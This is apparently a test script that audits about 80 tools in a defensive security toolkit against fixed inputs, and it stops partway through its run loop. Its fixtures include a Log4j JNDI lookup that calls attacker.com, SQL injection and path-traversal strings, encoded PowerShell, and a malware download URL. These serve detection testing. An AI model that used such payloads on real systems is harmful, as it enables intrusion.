import sys
import json
import re
from pathlib import Path

backend_dir = Path(__file__).resolve().parent
sys.path.insert(0, str(backend_dir))

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

from app.core.registry import execute_tool, TOOL_TO_SUITE
from app.models.schemas import SeverityLevel

# The user's exact canonical testcases for all 80 tools
EXACT_TESTCASES = {
    # Suite 1
    "url_analyzer": {
        "input": '{"url": "https://аcme.com/login (IDN: а = Cyrillic \'а\')", "brand": "Acme"}',
        "expect_keywords": ["homograph", "punycode", "phishing", "squat", "xn--"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "email_header_tracer": {
        "input": """Received: from mail1.evil.com (mail1.evil.com [203.0.113.10])
  by mx.acme.com (Postfix) with ESMTP id ABC123
  for <user@acme.com>; Mon, 5 Jan 2026 10:00:00 +0000 (UTC)
Received: from sender.example (sender.example [198.51.100.5])
  by mail1.evil.com (Postfix) with ESMTP id DEF456
  for <user@acme.com>; Mon, 5 Jan 2026 09:59:55 +0000 (UTC)""",
        "expect_keywords": ["hop", "mail1.evil.com", "delay"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CLEAN]
    },
    "spf_dkim_validator": {
        "input": """From: support@acme-c0rp.com
Authentication-Results: spf=fail smtp.mailfrom=acme-c0rp.com;
  dkim=none; dmarc=fail""",
        "expect_keywords": ["spf", "dkim", "dmarc", "fail", "spoof"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "phishing_lure_scorer": {
        "input": "Your account will be suspended in 2 hours. Click here to verify your credentials immediately.",
        "expect_keywords": ["urgency", "credential", "suspend"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "ioc_extractor": {
        "input": "Contact admin@evil.com or visit http://203.0.113.50/malware.exe. Also see 198.51.100.7 and CVE-2026-12345.",
        "expect_keywords": ["admin@evil.com", "203.0.113.50", "CVE-2026-12345"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "defanger_refanger": {
        "input": """hxxps://203[.]0[.]113[.]50/malware[.]exe
http://evil[.]com""",
        "expect_keywords": ["https://203.0.113.50/malware.exe", "http://evil.com"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "file_hash_calculator": {
        "input": "sample.bin: 4D5A90000300000004000000FFFF0000B8000000000000004000000000000000",
        "expect_keywords": ["MD5", "SHA-1", "SHA-256"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "entropy_calculator": {
        "input": "A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F90",
        "expect_keywords": ["entropy", "bits"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL, SeverityLevel.CLEAN]
    },
    "embedded_string_carver": {
        "input": "MZ..... cmd.exe .... powershell.exe -w hidden -enc JABz.... http://evil.com/c2",
        "expect_keywords": ["powershell", "cmd.exe"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "multi_layer_decoder": {
        "input": "VjJWc2IyRnRiV1Z1ZENCaGJHbHNjbk5vYldWdWRBPT0=",
        "expect_keywords": ["layer", "decod"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },

    # Suite 2
    "access_log_parser": {
        "input": '192.168.1.10 - - [05/Jan/2026:10:00:00 +0000] "GET /search?q=1\' OR \'1\'=\'1 HTTP/1.1" 200 1234 "-" "Mozilla/5.0"',
        "expect_keywords": ["192.168.1.10", "SQL", "GET"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "web_attack_scanner": {
        "input": """/search?q=1 UNION SELECT password FROM users--
/page?file=../../etc/passwd""",
        "expect_keywords": ["SQL", "passwd", "LFI", "Traversal"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "brute_force_detector": {
        "input": "Failed password for admin from 198.51.100.22 port 22 ssh2 (attempt 1)\nFailed password for admin from 198.51.100.22 port 22 ssh2 (attempt 2)\nFailed password for root from 198.51.100.22 port 22 ssh2 (attempt 3)\nFailed password for oracle from 198.51.100.22 port 22 ssh2 (attempt 4)\nFailed password for test from 198.51.100.22 port 22 ssh2 (attempt 5)",
        "expect_keywords": ["brute", "failed", "attempt", "spray"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "bot_fingerprinter": {
        "input": "User-Agent: python-requests/2.28.1\nAccept: */*\nConnection: keep-alive\nCadence: 100 requests every 500ms identical headers",
        "expect_keywords": ["bot", "scraper", "automated", "agent"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "windows_event_analyzer": {
        "input": '{"EventID": 4625, "TargetUserName": "Administrator", "WorkstationName": "DC01", "Status": "0xC000006D", "SubStatus": "0xC000006A"}\n{"EventID": 4688, "NewProcessName": "C:\\\\Windows\\\\System32\\\\powershell.exe", "CommandLine": "powershell -enc JABz..."}',
        "expect_keywords": ["4625", "4688", "powershell", "logon"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "sigma_evaluator": {
        "input": """title: Suspicious PowerShell Encoded Command
detection:
  selection:
    EventID: 4688
    CommandLine|contains: 'powershell -enc'
  condition: selection
---
Event:
  EventID: 4688
  CommandLine: 'powershell.exe -enc JABzAD0...'""",
        "expect_keywords": ["match", "powershell", "selection", "condition"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "statistical_anomaly": {
        "input": "Minute 1: 10 reqs\nMinute 2: 12 reqs\nMinute 3: 11 reqs\nMinute 4: 9 reqs\nMinute 5: 850 reqs (sudden surge)\nMinute 6: 10 reqs",
        "expect_keywords": ["surge", "anomaly", "spike", "z-score"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "useragent_inspector": {
        "input": "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
        "expect_keywords": ["outdated", "Windows 7", "IE", "Trident"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CLEAN]
    },
    "log_timeline_merger": {
        "input": """2026-01-05T10:02:15Z Host-A sshd[412]: Accepted publickey for root
Jan 5 10:00:12 Host-B apache2: GET /index.php 200
05/Jan/2026:10:05:00 +0000 Firewall: BLOCK TCP 203.0.113.10 -> 10.0.0.5:445""",
        "expect_keywords": ["timeline", "10:00:12", "10:02:15", "10:05:00"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "beaconing_analyzer": {
        "input": """10:00:00 -> 203.0.113.10:443 (128 B)
10:01:00 -> 203.0.113.10:443 (128 B)
10:02:00 -> 203.0.113.10:443 (128 B)
10:03:00 -> 203.0.113.10:443 (128 B)
10:04:00 -> 203.0.113.10:443 (128 B)""",
        "expect_keywords": ["beacon", "interval", "cv", "c2"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },

    # Suite 3
    "yara_generator": {
        "input": "backdoor.dll\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\ncmd.exe /c powershell",
        "expect_keywords": ["rule", "strings", "condition"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "suricata_rule_builder": {
        "input": 'Block TCP to 203.0.113.50:443 with payload containing "malware.exe"',
        "expect_keywords": ["alert", "drop", "tcp", "203.0.113.50", "443", "malware.exe", "sid"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "firewall_rule_synthesizer": {
        "input": """Block inbound TCP from 203.0.113.0/24 to 10.0.0.5:445.
Allow all other traffic to 10.0.0.5.""",
        "expect_keywords": ["iptables", "nftables", "DROP", "ACCEPT", "445", "203.0.113.0/24"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "csp_generator": {
        "input": "Domains: acme.com, cdn.acme.com, apis.google.com. Allow inline styles: false. Allow eval: false.",
        "expect_keywords": ["default-src", "script-src", "'self'", "cdn.acme.com"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "password_policy_tester": {
        "input": "Password: Summer2026!\nPolicy: Min 12 chars, require upper, lower, number, special char.",
        "expect_keywords": ["entropy", "policy", "length", "pass"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "linux_hardening_audit": {
        "input": """PermitRootLogin yes
PasswordAuthentication yes
X11Forwarding yes
Protocol 2
MaxAuthTries 10""",
        "expect_keywords": ["PermitRootLogin", "PasswordAuthentication", "audit", "cis"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "windows_audit_policy": {
        "input": "Target: Domain Controllers. Requirements: Log process creation command lines (4688), PowerShell ScriptBlock (4104), Kerberos ticket requests (4768).",
        "expect_keywords": ["auditpol", "4688", "ScriptBlock", "Kerberos"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "waf_rule_generator": {
        "input": "CVE-2021-44228 Log4j JNDI Exploit: ${jndi:ldap://attacker.com/exploit}",
        "expect_keywords": ["SecRule", "jndi", "REQUEST_URI", "WAF"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "dns_rpz_generator": {
        "input": "c2.evil.com\nphish.acme-login.net\nmalware-delivery.xyz",
        "expect_keywords": ["CNAME", "RPZ", "NXDOMAIN", "zone"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "honeytoken_generator": {
        "input": "Generate decoy AWS Access Key and Postgres Database credentials for Finance OU.",
        "expect_keywords": ["AKIA", "canary", "honeytoken", "decoy"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },

    # Suite 4
    "cert_decoder": {
        "input": """-----BEGIN CERTIFICATE-----
MIICljCCAX4CCQDC7...
-----END CERTIFICATE-----""",
        "expect_keywords": ["certificate", "issuer", "subject", "validity"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "jwt_inspector": {
        "input": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.",
        "expect_keywords": ["none", "jwt", "signature", "algorithm"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "hash_identifier": {
        "input": "5f4dcc3b5aa765d61d8327deb882cf99",
        "expect_keywords": ["MD5", "hash", "password"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "secret_leak_scanner": {
        "input": "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\nGITHUB_PAT = 'ghp_1234567890abcdefghijklmnopqrstuvwxyz12'\n-----BEGIN RSA PRIVATE KEY-----",
        "expect_keywords": ["AWS", "GitHub", "secret", "private key"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "tls_cipher_auditor": {
        "input": "TLS_RSA_WITH_RC4_128_SHA\nTLS_RSA_WITH_3DES_EDE_CBC_SHA\nTLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
        "expect_keywords": ["RC4", "3DES", "weak", "deprecated"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "entropy_density": {
        "input": "4D5A90000300000004000000FFFF0000B8000000000000004000000000000000",
        "expect_keywords": ["entropy", "density", "block"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "diffie_hellman_params": {
        "input": "Diffie-Hellman Prime Length: 1024 bits. Generator: 2.",
        "expect_keywords": ["1024", "Logjam", "weak", "2048"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "ssh_key_auditor": {
        "input": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC123456789... user@host (RSA 1024 bit)",
        "expect_keywords": ["RSA", "1024", "ED25519", "weak"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "password_hash_cracker": {
        "input": "Hash: 5f4dcc3b5aa765d61d8327deb882cf99\nDictionary: admin, password, 123456, letmein",
        "expect_keywords": ["password", "found", "match"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "rsa_key_validator": {
        "input": "RSA Key: Modulus length: 1024 bits. Public exponent e: 3.",
        "expect_keywords": ["1024", "exponent", "Fermat", "weak"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },

    # Suite 5
    "alert_deduplicator": {
        "input": """Alert 1: 10:00:01 - SQLi probe on /admin.php from 203.0.113.50
Alert 2: 10:00:02 - SQLi probe on /admin.php from 203.0.113.50
Alert 3: 10:00:05 - SQLi probe on /admin.php from 203.0.113.50""",
        "expect_keywords": ["cluster", "dedup", "count", "aggregate"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "triage_scorer": {
        "input": "Asset: Core Banking DB. Criticality: Tier 1. Vulnerability: Unauthenticated RCE. Exploit Status: Active in the wild.",
        "expect_keywords": ["priority", "score", "SLA"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "case_timeline_builder": {
        "input": """2026-01-05 10:15:00 - Phishing email opened by user
2026-01-05 10:17:30 - PowerShell downloaded payload from 203.0.113.50
2026-01-05 10:45:00 - Lateral movement via SMB to DC01
2026-01-05 11:30:00 - Exfiltration of customer data to c2.evil.com""",
        "expect_keywords": ["timeline", "dwell", "initial access", "exfiltration"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "report_generator": {
        "input": "Incident: Ransomware attack on finance cluster. 45 servers encrypted. Threat actor: BlackCat. Downtime: 6 hours. Root cause: Phishing.",
        "expect_keywords": ["executive", "ransomware", "CISO", "remediation"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "containment_playbook": {
        "input": "Incident Class: Ransomware outbreak on endpoint workstation finance-ws-04.",
        "expect_keywords": ["isolate", "containment", "playbook", "network"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "false_positive_analyzer": {
        "input": "Rule: Multiple PowerShell executions on developer workstation running automated CI/CD builds.",
        "expect_keywords": ["false positive", "tuning", "baseline", "noise"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "forensic_artifact_collector": {
        "input": "Host OS: Windows Server 2022. Scenario: Suspected RCE and web shell deployment.",
        "expect_keywords": ["prefetch", "event", "memory", "pcap"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "evidence_hash_verifier": {
        "input": "Forensic Image: disk_image.E01\nAcquisition Hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\nVerification Hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
        "expect_keywords": ["match", "integrity", "custody"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "severity_calculator": {
        "input": "Impact: 50,000 customer PII records exposed. Financial penalty risk: High (GDPR). Systems down: 3 core payment APIs.",
        "expect_keywords": ["critical", "severity", "GDPR"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "escalation_matrix": {
        "input": "Incident: Critical Active Directory compromise. Severity: P1. Current Time: Saturday 02:00 UTC.",
        "expect_keywords": ["escalation", "CISO", "SLA", "notification"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },

    # Suite 6
    "subnet_calculator": {
        "input": """Network: 10.0.0.0/22
Tasks: list /24 subnets, contains 10.0.1.255?, broadcast of 10.0.2.0/24""",
        "expect_keywords": ["10.0.0.0", "10.0.1.0", "10.0.2.0", "10.0.3.0", "route"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "bandwidth_estimator": {
        "input": """Link: 1 Gbps
Flow: 150 MB over 10 seconds""",
        "expect_keywords": ["Mbps", "saturation", "rate"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "port_reference": {
        "input": "Ports: 4444, 445, 53, 3389",
        "expect_keywords": ["Metasploit", "SMB", "DNS", "RDP"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "dns_tunnel_detector": {
        "input": "Queries:\naXNzb2Z0d2FyZQ==.v1.tunnel.evil.com\nbXlzZWNyZXRkYXRh.v1.tunnel.evil.com\nY29uZmlnZmlsZQ==.v1.tunnel.evil.com",
        "expect_keywords": ["tunnel", "entropy", "exfiltration"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "packet_loss_estimator": {
        "input": "Packets Sent: 1000, Packets Received: 850. RTT Samples: 45ms, 120ms, 85ms, 210ms, 50ms.",
        "expect_keywords": ["15", "loss", "jitter", "MOS"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL, SeverityLevel.CLEAN]
    },
    "mtu_overhead_calculator": {
        "input": "Base MTU: 1500. Encapsulation: IPsec ESP in Tunnel Mode (AES-256-GCM + SHA-256).",
        "expect_keywords": ["MSS", "overhead", "fragmentation", "bytes"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "dhcp_lease_parser": {
        "input": """lease 192.168.1.105 {
  starts 1 2026/01/05 10:00:00;
  ends 1 2026/01/05 22:00:00;
  hardware ethernet 00:11:22:33:44:55;
  client-hostname "kali-laptop";
}""",
        "expect_keywords": ["192.168.1.105", "00:11:22:33:44:55", "kali"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "vlan_hopping_analyzer": {
        "input": "Interface: GigabitEthernet0/1. Mode: Trunk. Native VLAN: 1. Allowed VLANs: 1-4094. 802.1Q double-tagged frames detected.",
        "expect_keywords": ["double-tag", "vlan", "hopping", "native"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "tls_sni_inspector": {
        "input": "ClientHello: SNI = stealth-c2.evil.xyz. Destination IP: 198.51.100.25 (Cloudflare CDN). Host header mismatch: legit-bank.com.",
        "expect_keywords": ["SNI", "fronting", "mismatch"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "tcp_handshake_auditor": {
        "input": "Flow Summary: 50,000 TCP SYN packets sent to target port 80. ACK responses: 0. RST received: 0.",
        "expect_keywords": ["SYN flood", "exhaustion", "handshake", "DDoS"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },

    # Suite 7
    "diamond_model_classifier": {
        "input": "Adversary: FancyBear (APT28). Capability: X-Agent implant. Infrastructure: 185.220.101.5. Victim: Ministry of Foreign Affairs.",
        "expect_keywords": ["adversary", "capability", "infrastructure", "victim"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "mitre_technique_mapper": {
        "input": "Attacker sent spearphishing attachment (macro Excel). Macro executed powershell.exe -enc to dump LSASS credentials via sekurlsa.",
        "expect_keywords": ["T1566", "T1059", "T1003", "MITRE"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "cvss_calculator": {
        "input": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
        "expect_keywords": ["score", "vector", "Critical", "High"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "threat_actor_profiler": {
        "input": "APT29 (Cozy Bear, Nobelium)",
        "expect_keywords": ["APT29", "Russia", "SVR", "SolarWinds"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "cisa_kev_lookup": {
        "input": "CVE-2021-44228, CVE-2023-34362, CVE-2024-1709",
        "expect_keywords": ["Log4j", "KEV", "MOVEit", "exploit"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "cve_search": {
        "input": "CVE-2021-44228",
        "expect_keywords": ["Log4j", "Apache", "CVSS", "10.0"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "kill_chain_mapper": {
        "input": "Phase 1: Port scan port 443. Phase 2: Dropped exploit.exe via unauthenticated HTTP. Phase 3: Connected to c2.badactor.com:8443.",
        "expect_keywords": ["Reconnaissance", "Delivery", "Exploitation", "Command and Control"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "asn_geo_lookup": {
        "input": "185.220.101.5",
        "expect_keywords": ["ASN", "Tor", "Germany", "hosting"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "ct_log_search": {
        "input": "acme-corporation.com",
        "expect_keywords": ["certificate", "subdomain", "log"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS]
    },
    "darkweb_mention_monitor": {
        "input": "Domain: acme-c0rp.com. Brand: Acme Corp.",
        "expect_keywords": ["mention", "credential", "leak", "forum"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL, SeverityLevel.CLEAN]
    },

    # Suite 8
    "pe_header_inspector": {
        "input": "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00PE\x00\x00L\x01\x03\x00",
        "expect_keywords": ["PE", "header", "x86", "machine"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "opcode_disassembler": {
        "input": "55 89 e5 83 ec 10 31 c0 c9 c3",
        "expect_keywords": ["push", "ebp", "mov", "xor", "ret"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "imphash_calculator": {
        "input": "KERNEL32.dll: CreateFileA, WriteFile, VirtualAllocEx. ADVAPI32.dll: OpenProcessToken, GetUserNameA.",
        "expect_keywords": ["imphash", "import", "hash"],
        "expect_verdict": [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS]
    },
    "section_entropy_mapper": {
        "input": "Section .text: Entropy 6.4 (Size: 45056 B)\nSection .data: Entropy 3.2 (Size: 8192 B)\nSection .upx0: Entropy 7.8 (Size: 102400 B)\nSection .rsrc: Entropy 4.1 (Size: 4096 B)",
        "expect_keywords": ["entropy", "upx", "packed"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "dll_dependency_walker": {
        "input": "Imports:\nKERNEL32.dll: LoadLibraryA, GetProcAddress, VirtualAlloc\nWS2_32.dll: WSAStartup, connect, send, recv\nWININET.dll: InternetOpenA, InternetConnectA",
        "expect_keywords": ["VirtualAlloc", "connect", "dependency", "import"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "string_obfuscation_detector": {
        "input": "Hex: 1b 17 17 02 4b 5d 5d 54 4b 17 12 16 11 02 (XOR key 0x5a encoded string)",
        "expect_keywords": ["XOR", "obfuscat", "key", "string"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "packed_executable_detector": {
        "input": "Binary Sections: UPX0, UPX1, .rsrc. EntryPoint: in UPX1 section. EP Bytes: 60 BE 00 10 40 00 (UPX stub)",
        "expect_keywords": ["UPX", "pack", "stub"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "syscall_tracer": {
        "input": "Disassembly: mov eax, 0x18; mov r10, rcx; syscall; ret (NtAllocateVirtualMemory direct invocation)",
        "expect_keywords": ["syscall", "direct", "evasion", "EDR"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "function_prologue_detector": {
        "input": "Address 0x7FFE0010: E9 45 12 34 00 (JMP 0x7FFE1255 - Inline Detour Hook). Standard expected: 48 89 5C 24 08.",
        "expect_keywords": ["hook", "detour", "prologue", "inline"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL]
    },
    "yara_rule_tester": {
        "input": """rule TestMalware {
    strings:
        $str1 = "powershell -enc"
        $str2 = "cmd.exe /c"
    condition:
        $str1 or $str2
}
---
Buffer: Host execution of powershell -enc JABzAD0...""",
        "expect_keywords": ["match", "syntax", "valid"],
        "expect_verdict": [SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL, SeverityLevel.CLEAN]
    }
}

def run_audit():
    print("=" * 80)
    print("      RUNNING USER'S EXACT TESTCASES ACROSS ALL 80 CIPHERGUARD TOOLS")
    print("=" * 80)

    working_tools = []
    broken_tools = []

    for tool_id, test_info in EXACT_TESTCASES.items():
        suite_id = TOOL_TO_SUITE.get(tool_id, "unknown")
        test_input = test_info["input"]
        expect_kw = test_info.get("expect_keywords", [])
        expect_v = test_info.get("expect_verdict", [])

        try:
            res = execute_tool(tool_id, test_input, {})
            
            # Combine all output text to search for expected behavior
            all_text = " ".join([
                res.summary or "",
                res.threat_impact or "",
                res.attack_objective or "",
                res.generated_payload or "",
                res.extracted_secret or "",
                " ".join([f"{e.label} {e.value}" for e in (res.technical_evidence or [])]),
                " ".join([f"{cmd.title} {cmd.platform} {cmd.command} {cmd.description or ''}" if hasattr(cmd, 'command') else str(cmd) for cmd in (res.remediation_playbook or [])])
            ]).lower()

            reasons = []

            # Check verdict validity
            if expect_v and res.verdict not in expect_v:
                reasons.append(f"Unexpected verdict: {res.verdict.value} (expected one of {[v.value for v in expect_v]})")

            # Check keyword / concept matching
            matched_kws = [k for k in expect_kw if k.lower() in all_text]
            if expect_kw and len(matched_kws) == 0:
                reasons.append(f"Missing expected output concepts. Expected any of: {expect_kw}")

            # Check if output is a static fallback / error message
            if "not implemented" in all_text or "placeholder" in all_text or ("stub" in all_text and "stub" not in [k.lower() for k in expect_kw]):
                reasons.append("Tool returned stub / placeholder content")

            if reasons:
                broken_tools.append({
                    "tool_id": tool_id,
                    "suite_id": suite_id,
                    "reasons": reasons,
                    "verdict": res.verdict.value,
                    "score": res.risk_score,
                    "summary": res.summary[:120] if res.summary else "No summary"
                })
                print(f"[-] [BROKEN] [{suite_id}] {tool_id:<28} -> {', '.join(reasons)}")
            else:
                working_tools.append(tool_id)
